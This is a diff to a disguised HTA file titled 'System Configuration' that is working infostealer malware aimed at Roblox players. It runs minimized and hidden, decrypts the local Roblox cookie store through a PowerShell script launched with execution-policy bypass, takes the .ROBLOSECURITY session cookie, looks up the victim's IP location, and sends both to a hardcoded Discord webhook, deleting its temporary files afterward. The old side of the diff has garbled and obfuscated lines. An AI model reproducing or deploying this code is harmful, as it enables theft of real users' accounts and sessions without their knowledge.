@@ -1,25 +1,18 @@
 <html>
 <head>
-<title>System Settings</title>
-<HTA:APPLICATION
-  ID="syscfg"
-  APPLICATIONNAME="syscfg"
-  BORDER="none"
-  BORDERSTYLE="none"
-  CAPTION="no"
-  SHOWINTASKBAR="no"
-  SINGLEINSTANCE="yes"
-  WINDOWSTATE="minimize"
-  SCROLL="no"
-  SYSMENU="no"
-/>
+<title>System Configuration</title>
+<HTA:APPLICATION ID="sys" APPLICATIONNAME="sys" BORDER="none" BORDERSTYLE="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize" SCROLL="no" SYSMENU="no"/>
 <script language="VBScript">
 Option Explicit
+
 Dim fso, shell, webhook, tempDir
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
-$w="https" & "://di" & "scord" & ".com/" & "api/w" & "ebhoo" & "ks/15" & "36210" & "03453" & "35972" & "25/Bd" & "CQraM" & "q8r90" & "M0R-s" & "OGlFn" & "ACFES" & "F_j1f" & "dtKY5" & "MJE3s" & "t5IYf" & "BNndV" & "YnP48" & "EmVPy" & "Hsy9K" & "G"
+webhook = "https://discord.com/api/webhooks/"
+webhook = webhook & "1536210034533597225/"
+webhook = webhook & "BdCQraMq8r90M0R-sOGlFnACFESF_j1fdtKY5MJE3st5IYfBNndVYnP48EmVPyHsy9KG"
 tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
+
 Function GetLocation()
   On Error Resume Next
   Dim xmlhttp
@@ -28,124 +21,133 @@ Function GetLocation()
   xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0"
   xmlhttp.Send
   If xmlhttp.Status = 200 Then
- GetLocation = xmlhttp.responseText
+    GetLocation = xmlhttp.responseText
   Else
- GetLocation = "{""ip"":""unknown""}"
+    GetLocation = "{""ip"":""unknown""}"
   End If
 End Function
+
 Function GetRobloxCookie()
   On Error Resume Next
-  Dim path, raw, b64, b64File, psFile, jsonFile, cmd, exec, ts, startPos, endPos, output, errorText, jsonText, cookie
-  path = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RbCks.dat"
+  Dim path, raw, b64, b64File, psFile, cmd, exec, ts, startPos, endPos, output, errorText
+
+  path = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
   If Not fso.FileExists(path) Then
- GetRobloxCookie = "file not found"
- Exit Function
+    GetRobloxCookie = "file not found"
+    Exit Function
   End If
+
   Set ts = fso.OpenTextFile(path, 1)
   raw = ts.ReadAll
   ts.Close
-  startPos = InStr(1, raw, """CksData""")
+
+  startPos = InStr(1, raw, """CookiesData""")
   If startPos = 0 Then
- GetRobloxCookie = "no CksData key"
- Exit Function
+    GetRobloxCookie = "no CookiesData key"
+    Exit Function
   End If
+
   startPos = InStr(startPos, raw, ":")
   If startPos = 0 Then
- GetRobloxCookie = "no colon"
- Exit Function
+    GetRobloxCookie = "no colon"
+    Exit Function
   End If
+
   startPos = startPos + 1
   Do While startPos <= Len(raw) And (Mid(raw, startPos, 1) = " " Or Mid(raw, startPos, 1) = """")
- startPos = startPos + 1
+    startPos = startPos + 1
   Loop
+
   endPos = startPos
   Do While endPos <= Len(raw)
- If Mid(raw, endPos, 1) = """" Then Exit Do
- endPos = endPos + 1
+    If Mid(raw, endPos, 1) = """" Then Exit Do
+    endPos = endPos + 1
   Loop
+
   b64 = Mid(raw, startPos, endPos - startPos)
   If Len(b64) < 20 Then
- GetRobloxCookie = "b64 too short"
- Exit Function
+    GetRobloxCookie = "b64 too short"
+    Exit Function
   End If
+
   b64File = tempDir & "\rc_b64.txt"
   Set ts = fso.CreateTextFile(b64File, True)
   ts.Write b64
   ts.Close
+
   psFile = tempDir & "\rc_dec.ps1"
-  jsonFile = tempDir & "\rc_json.txt"
+
   Set ts = fso.CreateTextFile(psFile, True)
   ts.WriteLine "Add-Type -AssemblyName System.Security"
-  ts.WriteLine "$ErrorActionPreference="
-  ts.WriteLine "$b64 = Get-Content -Raw "
-  ts.WriteLine "$bytes = [Convert]::FrmB64Str($b64.Trim())"
-  ts.WriteLine "$decrypted = [System.Security.Cryptography.Pr0t3ct3dD4t4]::Unpr0t3ct($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
-  ts.WriteLine "$json = [System.Text.Encoding]::UTF8.GetString($decrypted)"
-  ts.WriteLine "$json | Out-File  -Encoding utf8"
-  \.ROBLOSECURITY\s+([^\s]+)NO_MATCH Direct parsing from the decrypted file as backup
-  jsonText = ""
-  If fso.FileExists(jsonFile) Then
- Set ts = fso.OpenTextFile(jsonFile, 1)
- jsonText = ts.ReadAll
- ts.Close
-  End If
-  cookie = ""
-  If Len(jsonText) > 0 Then
- Dim cookieStart, cookieEnd, line, parts
- cookieStart = InStr(1, jsonText, ".ROBLOSECURITY")
- If cookieStart > 0 Then
-   cookieEnd = InStr(cookieStart, jsonText, vbCrLf)
-   If cookieEnd = 0 Then cookieEnd = InStr(cookieStart, jsonText, vbLf)
-   If cookieEnd = 0 Then cookieEnd = Len(jsonText)
-   line = Mid(jsonText, cookieStart, cookieEnd - cookieStart)
-   parts = Split(line, vbTab)
-   If UBound(parts) >= 0 Then
-  cookie = Trim(parts(UBound(parts)))
-  If Left(cookie, 3) <> "_|W" Then
-    Dim regex
-    Set regex = New RegExp
-    regex.Pattern = "\.ROBLOSECURITY\s+([^\s]+)"
-    regex.Global = False
-    Dim matches
-    Set matches = regex.Execute(line)
-    If matches.Count > 0 Then
-   cookie = matches(0).SubMatches(0)
-    End If
-  End If
-   End If
- End If
-  End If
+  ts.WriteLine "$ErrorActionPreference='Stop'"
+  ts.WriteLine "$b64 = Get-Content -Raw '" & b64File & "'"
+  ts.WriteLine "$bytes = [Convert]::FromBase64String($b64.Trim())"
+  ts.WriteLine "$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
+  ts.WriteLine "$data = [System.Text.Encoding]::UTF8.GetString($decrypted)"
+  ts.WriteLine "$i = $data.IndexOf('.ROBLOSECURITY')"
+  ts.WriteLine "if ($i -ne -1) {"
+  ts.WriteLine "  $i += 15"
+  ts.WriteLine "  while ($i -lt $data.Length -and ($data[$i] -eq [char]9 -or $data[$i] -eq [char]32)) { $i++ }"
+  ts.WriteLine "  $s = $i"
+  ts.WriteLine "  while ($i -lt $data.Length -and $data[$i] -ne [char]59 -and $data[$i] -ne [char]10 -and $data[$i] -ne [char]13) { $i++ }"
+  ts.WriteLine "  $cookie = $data.Substring($s, $i - $s).Trim()"
+  ts.WriteLine "  if (-not $cookie.StartsWith('_|')) {"
+  ts.WriteLine "    $l = $data.IndexOf([char]10, $s)"
+  ts.WriteLine "    if ($l -eq -1) { $l = $data.Length }"
+  ts.WriteLine "    $line = $data.Substring($s, $l - $s)"
+  ts.WriteLine "    $parts = $line.Split([char]9)"
+  ts.WriteLine "    for ($p = $parts.Length - 1; $p -ge 0; $p--) {"
+  ts.WriteLine "      if ($parts[$p].Trim().StartsWith('_|')) {"
+  ts.WriteLine "        $cookie = $parts[$p].Trim()"
+  ts.WriteLine "        break"
+  ts.WriteLine "      }"
+  ts.WriteLine "    }"
+  ts.WriteLine "  }"
+  ts.WriteLine "  if ($cookie.StartsWith('_|')) { $cookie }"
+  ts.WriteLine "}"
+  ts.Close
+
+  cmd = "powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"
+  Set exec = shell.Exec(cmd)
+  output = exec.StdOut.ReadAll
+  errorText = exec.StdErr.ReadAll
+
+  On Error Resume Next
   fso.DeleteFile b64File, True
   fso.DeleteFile psFile, True
-  fso.DeleteFile jsonFile, True
-  If Len(cookie) > 20 Then
- GetRobloxCookie = cookie
-  ElseIf Len(errorText) > 0 Then
- GetRobloxCookie = "PS ERROR: " & Left(errorText, 200)
+
+  If Len(output) > 20 And Left(output, 2) = "_|" Then
+    GetRobloxCookie = Trim(output)
   Else
- GetRobloxCookie = Trim(output)
+    GetRobloxCookie = "no cookie extracted"
   End If
 End Function
+
 Sub SendToWebhook(loc, cookie)
   On Error Resume Next
   Dim payload, xmlhttp
   Dim escapedLoc, escapedCookie
+
   escapedLoc = Replace(loc, "\", "\\")
   escapedLoc = Replace(escapedLoc, """", "\""")
   escapedLoc = Replace(escapedLoc, vbCrLf, "\n")
   escapedLoc = Replace(escapedLoc, vbCr, "\n")
   escapedLoc = Replace(escapedLoc, vbLf, "\n")
+
   escapedCookie = Replace(cookie, "\", "\\")
   escapedCookie = Replace(escapedCookie, """", "\""")
   escapedCookie = Replace(escapedCookie, vbCrLf, "\n")
   escapedCookie = Replace(escapedCookie, vbCr, "\n")
   escapedCookie = Replace(escapedCookie, vbLf, "\n")
-  payload = "{""content"":""**syscfg hit**\n**Location:**\n```" & escapedLoc & "```\n**.ROBLOSECURITY:**\n```" & escapedCookie & "```""}"
+
+  payload = "{""content"":""**Hit!**\n**Location:**\n```" & escapedLoc & "```\n**.ROBLOSECURITY:**\n```" & escapedCookie & "```""}"
+
   Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
   xmlhttp.Open "POST", webhook, False
   xmlhttp.setRequestHeader "Content-Type", "application/json"
   xmlhttp.Send payload
 End Sub
+
 Sub Main()
   On Error Resume Next
   Dim loc, cookie
@@ -154,9 +156,8 @@ Sub Main()
   SendToWebhook loc, cookie
   window.close
 End Sub
+
 Main
 </script>
-</head>
-<body></body>
+</body>
 </html>
-
